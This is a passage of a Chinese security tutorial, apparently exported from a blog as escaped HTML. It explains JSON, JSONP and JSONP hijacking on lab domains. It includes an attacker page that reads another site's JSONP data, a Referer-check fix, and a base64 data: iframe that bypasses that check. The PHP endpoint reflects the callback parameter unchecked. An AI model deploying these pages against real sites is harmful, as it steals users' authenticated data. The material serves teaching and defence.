class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>会因跨域而被浏览器拦截（因同源策略原因无法直接获取其他主机文档信息）</p>\n<p><img src=\"/images/jsonp/image-20200627094603295.png\" alt=\"image-20200627094956151\"></p>\n<h4 id=\"跨域访问\"><a href=\"#跨域访问\" class=\"headerlink\" title=\"跨域访问\"></a>跨域访问</h4><p>1、html在这个域名下</p>\n<p><code>http://bwapp.me:4444/data.html</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;\\n&quot;</span><span class=\"string\">&quot;age:&quot;</span>+data.age);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>2、JS文件在此域名下</p>\n<p><code>http://yourls.me:4444/data.js</code></p>\n<p><img src=\"/images/jsonp/image-20200627114105044.png\" alt=\"image-20200627114105044\"></p>\n<p>3、访问<code>http://bwapp.me:4444/data.html</code>跨域访问成功</p>\n<p><img src=\"/images/jsonp/image-20200627114330651.png\" alt=\"image-20200627114330651\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>bwapp.me直接获取data.js内的数据，因data.js内只有一个函数，如涉及多个函数，data.html(客户端)将导致客户端无法确定调哪个函数。而无法输出对应数据。</p>\n<p>data.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;age:&quot;</span>+data.age);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"javascript\"><span class=\"comment\">//新建一个test1函数</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\">test3</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>=test3.name+<span class=\"string\">&quot;city:&quot;</span>+test3.city);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">//访问后并不能直接输出对应数据信息。</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSONP动态调用\"><a href=\"#JSONP动态调用\" class=\"headerlink\" title=\"JSONP动态调用\"></a>JSONP动态调用</h4><p>在客户端中添加callback回调函数</p>\n<p>data.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test1</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(<span class=\"string\">&quot;name:&quot;</span> + data.name + <span class=\"string\">&quot;city:&quot;</span> + data.city);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test2</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(<span class=\"string\">&quot;name:&quot;</span> + data.name);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--&lt;script src=&quot;http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent&quot;&gt;&lt;/script&gt;--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>data.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data1=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;si1ent&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;Anhui&quot;</span>);</span><br><span class=\"line\">$data2=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;SH&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;si1ent&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$callback = $_GET[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">exit</span>($callback.<span class=\"string\">&quot;(&quot;</span>.json_encode($data).<span class=\"string\">&quot;)&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>访问</p>\n<p><code>http://bwapp.me:4444/data.html</code></p>\n<p><code>http://yourls.me:4444/data.php?callback=test1&amp;name=si1ent</code></p>\n<p><img src=\"/images/jsonp/image-20200627134931765.png\" alt=\"image-20200627134931765\"></p>\n<p>注：</p>\n<p>因前后端都存在两条以上数据，这里指定了callback==test1因此会弹出名字及城市信息。</p>\n<p>如callback=test2，则只会显示name对应值，不显示城市信息。</p>\n<p><img src=\"/images/jsonp/image-20200627135745378.png\" alt=\"image-20200627135745378\"></p>\n<h4 id=\"jQuery调用JSONP\"><a href=\"#jQuery调用JSONP\" class=\"headerlink\" title=\"jQuery调用JSONP\"></a>jQuery调用JSONP</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html &gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;Test&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;libs.baidu.com&#x2F;jquery&#x2F;1.9.0&#x2F;jquery.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class=\"line\">    $(document).ready(function()&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">             type: &quot;get&quot;,</span><br><span class=\"line\">             url: &quot;http:&#x2F;&#x2F;yourls.me:4444&#x2F;data.php?name&#x3D;admin&quot;,</span><br><span class=\"line\">             dataType: &quot;jsonp&quot;,</span><br><span class=\"line\">             jsonp: &quot;callback&quot;,&#x2F;&#x2F;传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span><br><span class=\"line\">             jsonpCallback:&quot;test1&quot;,&#x2F;&#x2F;自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据</span><br><span class=\"line\">             success: function(data)&#123;</span><br><span class=\"line\">                 alert(&quot;name:&quot;+data.name+&quot;city:&quot;+data.city);</span><br><span class=\"line\">             &#125;,</span><br><span class=\"line\">             error: function()&#123;</span><br><span class=\"line\">                 alert(&#39;fail&#39;);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jsonp/image-20200627140710365.png\" alt=\"image-20200627140710365\"></p>\n<p>jQuery会自动调用callback函数。</p>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>由以上实例及演示得知，JSONP是为了解决跨域而传输JSON格式数据的一种方式。</p>\n<h3 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h3><h4 id=\"JSONP劫持\"><a href=\"#JSONP劫持\" class=\"headerlink\" title=\"JSONP劫持\"></a>JSONP劫持</h4><p>JSONP本质上属于CSRF(跨站请求伪造：利用更多是修改密码等攻击)，而JSONP主要是攻击目标站点并获取数据的一种攻击方式。</p>\n<p>而造成这一问题的主要原因：目标站点未对请求的referer进行限制和检查，导致任何站点都可以访问JSON数据。</p>\n<h4 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h4><p>后台数据还是以data.php<code>http://yourls.me:4444/data.php</code>为主，而此时referer不再是<code>http://bwapp.me:4444/</code>而是新的地址<code>http://jsonp.me:4444/</code></p>\n<p> 新建jsonp.html文件（放到<code>http://jsonp.me:4444/</code>下）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">csrf</span>(<span class=\"params\">data</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    alert(<span class=\"string\">&quot;name:&quot;</span>+data.name+<span class=\"string\">&quot;city:&quot;</span>+data.city);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://yourls.me:4444/data.php?callback=csrf&amp;name=admin&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>http://jsonp.me:4444/jsonp.html</code></p>\n<p><img src=\"/images/jsonp/image-20200627142742830.png\" alt=\"image-20200627142742830\"></p>\n<h4 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h4><p>1、限制referer</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>]!==<span class=\"string\">&#x27;http://bwapp.me:4444/jquery.html&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;非法访问&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以下简单添加referer验证</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$data1=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;si1ent&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;Anhui&quot;</span>);</span><br><span class=\"line\">$data2=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span>=&gt;<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;city&quot;</span>=&gt;<span class=\"string\">&quot;SH&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>]!==<span class=\"string\">&#x27;http://bwapp.me:4444/jquery.html&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>(<span class=\"string\">&quot;非法访问&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;si1ent&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_GET[<span class=\"string\">&#x27;name&#x27;</span>]===<span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    $data=$data2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$callback = $_GET[<span class=\"string\">&#x27;callback&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">exit</span>($callback.<span class=\"string\">&quot;(&quot;</span>.json_encode($data).<span class=\"string\">&quot;)&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jsonp/image-20200627145813752.png\" alt=\"image-20200627145813752\"></p>\n<p>2、使用token</p>\n<p>随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问（token后台服务随机分配）</p>\n<h4 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h4><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY3NyZihkYXRhKXsKICAgIGFsZXJ0KCJuYW1lOiIrZGF0YS5uYW1lKyJjaXR5OiIrZGF0YS5jaXR5KTsKfQo8L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHA6Ly95b3VybHMubWU6NDQ0NC9kYXRhLnBocD9jYWxsYmFjaz1jc3JmJm5hbWU9YWRtaW4iPgo8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.smi1e.top&#x2F;%E6%B5%85%E8%B0%88-jsonp&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6539</span><br><span class=\"line\">https:&#x2F;&#x2F;blog.knownsec.com&#x2F;2015&#x2F;03&#x2F;jsonp_security_technic&#x2F;</span><br><span class=\"line\">之前乌云drops文档</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。                                                                                        –摘自网络</p>\n<h3 id=\"JSON介绍\"><a href=\"#JSON介绍\" class=\"headerlink\" title=\"JSON介绍\"></a>JSON介绍</h3><p><a href=\"https://www.json.org/json-zh.html\">JSON官网</a></p>\n<p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language, Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言.</p>\n<h4 id=\"JSON建构于两种结构\"><a href=\"#JSON建构于两种结构\" class=\"headerlink\" title=\"JSON建构于两种结构\"></a>JSON建构于两种结构</h4><p>“名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为<em>对象（object）</em>、纪录（record）、结构（struct）、字典（dictionary）、哈希表（hash table）、有键列表（keyed list），或者关联数组 （associative array）。 </p>\n<p>值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。</p>\n<p>这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。</p>\n<p>JSON具有以下这些形式</p>\n<p><code>对象</code>是一个无序的“‘名称/值’对”集合。一个对象以 {  }。每个“名称”后跟一个 “<code>:</code>“ ；“名称/值’ 对”之间使用 ,(逗号) 分隔。</p>\n<p><img src=\"https://www.json.org/img/object.png\" alt=\"img\"></p>\n<p><code>数组</code>是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号分隔</p>\n<p><img src=\"https://www.json.org/img/array.png\" alt=\"img\"></p>\n<p><code>值</code>（<em>value</em>）可以是双引号括起来的字符串（<em>string</em>）、数值(number)、<code>true</code>、<code>false</code>、 <code>null</code>、对象（object）或者数组（array）。这些结构可以嵌套。</p>\n<p><img src=\"https://www.json.org/img/value.png\" alt=\"img\"></p>\n<p><code>字符串</code>（<em>string</em>）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。</p>\n<p>字符串（string）与C或者Java的字符串非常相似。</p>\n<p><img src=\"https://www.json.org/img/string.png\" alt=\"img\"></p>\n<p><code>数值</code>（<em>number</em>）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。</p>\n<p><img src=\"https://www.json.org/img/number.png\" alt=\"img\"></p>\n<p>空白可以加入到任何符号之间。 以下描述了完整的语言。</p>\n<p><img src=\"https://www.json.org/img/whitespace.png\" alt=\"img\"></p>\n<h3 id=\"JSONP介绍\"><a href=\"#JSONP介绍\" class=\"headerlink\" title=\"JSONP介绍\"></a>JSONP介绍</h3><p>JSONP(JSON with Padding) 是 JSON 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>\n<p>为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略的限制。</p>\n<p><code>同源策略</code>，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。</p>\n<p>文件存放另一域名下：</p>\n<p><code>http://yourls.me:4444/json.txt</code></p>\n<p><img src=\"/images/jsonp/image-20200627094956151.png\" alt=\"image-20200627094956151\"></p>\n<h4 id=\"XHR调用\"><a href=\"#XHR调用\" class=\"headerlink\" title=\"XHR调用\"></a>XHR调用</h4><p><code>http://bwapp.me:4444/bwAPP/xhr.html</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;XHR&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var request &#x3D; new XMLHttpRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    request.onreadystatechange &#x3D; function () &#123;</span><br><span class=\"line\">        if (request.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class=\"line\">            if (request.status &#x3D;&#x3D;&#x3D; 200) &#123;</span><br><span class=\"line\">                alert(&#39;success!&#39;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;yourls.me:4444&#x2F;json.txt&#39;);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>会因跨域而被浏览器拦截（因同源策略原因无法直接获取其他主机文档信息）</p>\n<p><img src=\"/images/jsonp/image-20200627094603295.png\" alt=\"image-20200627094956151\"></p>\n<h4 id=\"跨域访问\"><a href=\"#跨域访问\" class=\"headerlink\" title=\"跨域访问\"></a>跨域访问</h4><p>1、html在这个域名下</p>\n<p><code>http://bwapp.me:4444/data.html</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span 